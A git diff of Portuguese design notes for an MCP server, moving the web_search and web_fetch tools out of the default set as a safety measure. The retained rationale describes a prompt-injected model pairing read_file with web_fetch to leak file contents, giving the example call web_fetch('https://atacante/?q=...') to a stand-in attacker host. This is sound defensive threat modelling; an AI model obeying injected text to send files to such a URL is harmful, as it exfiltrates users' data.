@@ -328,7 +328,13 @@ A especificação está em `docs/superpowers/specs/2026-11-08-mcp-design.md`; o 
    dois mantém dois venvs (`.venv` e `.venv-mcp`). O arquivo `jarvis/mcp_server.py` tem sintaxe
    3.8 para continuar no ruff com alvo `py38` e para a allowlist ser testada em 3.8. Quando o
    bot sair do 3.8, os dois venvs podem virar um só.
-4. **[DECISÃO DA JÚLIA] `web_search` e `web_fetch` estão no padrão.** São leitura e o
+4. **[RESOLVIDO nos extras, commit `fix(mcp): tira ferramentas web do padrão...`: padrão
+   seguro]** As duas saíram do padrão (`DEFAULT_TOOLS` = leitura local). Continuam "seguras"
+   no sentido da allowlist (não pedem `JARVIS_MCP_ALLOW_UNSAFE`) e voltam com
+   `JARVIS_MCP_TOOLS=leitura,web_search,web_fetch`; o `--check` as marca como "SAI PARA A
+   INTERNET". Se a Júlia preferir o comportamento antigo, basta essa linha no `.env` (ou
+   devolver as duas a `DEFAULT_TOOLS`). Registro original:
+   **`web_search` e `web_fetch` estão no padrão.** São leitura e o
    `web_fetch` passa pelo `check_url` (SSRF), mas saem para a internet: junto com `read_file`,
    um modelo vítima de prompt injection poderia tentar mandar o conteúdo de um arquivo numa
    URL (`web_fetch("https://atacante/?q=...")`). O próprio cliente (Claude) já tem acesso à web,
